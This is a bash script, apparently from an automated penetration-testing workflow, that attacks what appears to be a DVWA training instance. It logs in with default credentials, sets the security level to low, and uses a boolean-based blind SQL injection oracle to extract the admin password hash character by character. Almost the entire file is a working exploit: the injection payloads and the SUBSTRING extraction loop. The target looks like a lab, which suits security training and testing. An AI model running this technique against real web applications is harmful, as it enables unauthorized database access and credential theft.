#!/bin/bash
BASE='http://172.17.0.1:3100'
COOKIE='/tmp/bsqli_cookies.txt'
rm -f "$COOKIE"
curl -s -L -o /tmp/bsqli_login_page.html -w 'LOGIN_PAGE: %{http_code}' -c "$COOKIE" "$BASE/login.php"; echo
TOKEN=$(grep -o 'user_token[^>]*' /tmp/bsqli_login_page.html | grep -o "value='[^']*'" | head -1 | cut -d"'" -f2)
curl -s -L -b "$COOKIE" -c "$COOKIE" -d 'username=admin&password=password&Login=Login&user_token='$TOKEN "$BASE/login.php" -o /tmp/bsqli_login.html
if grep -q 'Logout' /tmp/bsqli_login.html; then LOGIN='OK'; else LOGIN='FAIL'; fi
curl -s -L -b "$COOKIE" -c "$COOKIE" "$BASE/security.php" -o /tmp/bsqli_sec.html
STOKEN=$(grep -o 'user_token[^>]*' /tmp/bsqli_sec.html | grep -o "value='[^']*'" | head -1 | cut -d"'" -f2)
curl -s -L -b "$COOKIE" -c "$COOKIE" -d 'security=low&seclevelf=Submit&user_token='$STOKEN "$BASE/security.php" -o /tmp/bsqli_sec2.html
echo "LOGIN: $LOGIN"
echo 'SECURITY: low'
oracle() {
curl -s -L -b "$COOKIE" -c "$COOKIE" --get "$BASE/vulnerabilities/sqli_blind/" --data-urlencode "id=$1" --data-urlencode 'Submit=Submit' | grep -q 'User ID exists'
}
if oracle "1"; then BASELINE='exists'; else BASELINE='missing'; fi
echo "BASELINE id=1: $BASELINE"
if oracle "1' AND '1'='1' -- "; then TRUE='exists'; else TRUE='missing'; fi
if oracle "1' AND '1'='2' -- "; then FALSE='exists'; else FALSE='missing'; fi
echo "TRUE_TEST 1 AND 1=1: $TRUE"
echo "FALSE_TEST 1 AND 1=2: $FALSE"
HASH=''
for POS in $(seq 1 32); do
FOUND='?'
for C in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
if oracle "1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),$POS,1)='$C' -- "; then FOUND="$C"; break; fi
done
HASH="$HASH$FOUND"
echo "POS $POS: $FOUND"
done
echo "ADMIN_HASH: $HASH"
# VERDICT (playbook rule #3 — must be the LAST line, exact wording)
if [ "$BASELINE" = 'exists' ] && [ "$TRUE" = 'exists' ] && [ "$FALSE" = 'missing' ] && [ ${#HASH} -eq 32 ]; then echo 'VERDICT: CONFIRMED'; else echo 'VERDICT: FAILED'; fi
